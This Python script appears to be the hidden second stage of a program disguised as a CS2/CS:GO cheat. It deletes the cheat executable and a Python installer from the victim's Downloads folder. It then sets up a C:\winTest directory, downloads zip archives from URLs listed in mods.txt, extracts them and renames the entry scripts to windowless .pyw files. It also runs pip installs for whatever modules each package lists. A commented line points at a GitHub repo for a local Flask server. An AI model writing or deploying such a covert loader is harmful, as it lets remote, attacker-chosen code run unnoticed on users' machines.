def getDownloadPath():
    path=os.getcwd()
    path=path.split('\\')
    t=path.index('Users')+1
    path=path[:t+1]
    path.append('Downloads')
    path.append('python-3.12.1-amd64.exe')
    path='\\'.join(path)
    return path
def downloadAndSetupMod(urlGit,name,fileName):
    if not os.path.isdir(f"C:\\winTest\\{name}"):
        installed=[]
        noInstalled=[]
        os.mkdir(f"C:\\winTest\\{name}")
        try:
            response = requests.get(urlGit)
        except:
            return "noReposytory"
        zip_data = response.content
        with open(f"C:\\winTest\\{name}\\archive.zip", 'wb') as file:
            file.write(zip_data)
        with ZipFile(f"C:\\winTest\\{name}\\archive.zip", 'r') as zip_ref:
            zip_ref.extractall(f"C:\\winTest\\{name}")
        os.remove(f"C:\\winTest\\{name}\\archive.zip")
        dirSetupName=os.listdir(f"C:\\winTest\\{name}")[0]
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\{fileName}{'.py'}",f"C:\\winTest\\{name}\\{fileName}{'.pyw'}")
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\data",f"C:\\winTest\\{name}")
        shutil.rmtree(f"C:\\winTest\\{name}\\{dirSetupName}")
#        settingsFile=os.listdir(f"C;\\winTest\\{name}\\{dirSetupName}")[os.listdir(f"C;\\winTest\\{name}\\{dirSetupName}").index("modules.txt")]
#        shutil.rmtree(f"C:\\winTest\\{name}")
        print(dirSetupName)
        modules=[]
        with open(f"C:\\winTest\\{name}\\data\\modules.txt") as file:
            for line in file:
                modules.append(line.rstrip('\n'))
        for i in modules:
            if int(os.system(f"pip3 install {i}"))==0:
                installed.append(i)
            else:
                noInstalled.append(i)
        with open("C:\\winTest\\modules.txt") as file:
            for line in file:
                modules.append(line.rstrip('\n'))
        modules=list(set(modules))
        with open("C:\\winTest\\modules.txt","w") as file:
            for i in modules:
                file.write(i+'\n')
        with open("C:\\winTest\\mods.txt","a") as file:
            file.write(name)
        return installed,noInstalled
    else:
        return "module installed"
def deletaEXE():
    with open("C:\\winTest\\dir.txt") as file:
        x=file.read().rstrip('\n').split('\\')[:-1]
    x1=x.copy()
    x.append('cs2_cs-go_cheat.exe')
    x1.append('python-3.12.1-amd64.exe')
    os.remove('\\'.join(x))
    os.remove('\\'.join(x1))


import subprocess,time,os,requests,shutil
from zipfile import ZipFile
deletaEXE()
if not os.path.isfile("C:\\winTest\\modules.txt"):
    with open("C:\\winTest\\modules.txt","w"):
        pass
if not os.path.isfile("C:\\winTest\\mods.txt"):
    with open("C:\\winTest\\mods.txt","w"):
        pass
mods=[]
modules=[]
with open("C:\\winTest\\mods.txt") as file:
    for line in file:
        mods.append(line.rstrip("\n"))
for i in mods:
    url,n1,n2=i.split(' ')
    print(downloadAndSetupMod(url,n1,n2))


# Запуск второго файла в отдельном процессе
#process = subprocess.Popen(['python', 'C:\\winTest\\localServ\\localServ.pyw'])

# ждем некоторое время, прежде чем прервать выполнение
#time.sleep(30)

# Прерывание выполнения второго файла
#process.terminate()


#print(downloadAndSetupMod('https://api.github.com/repos/Nick1t0s/localServOnFlask/zipball','localServ','localServ'))
print(getDownloadPath())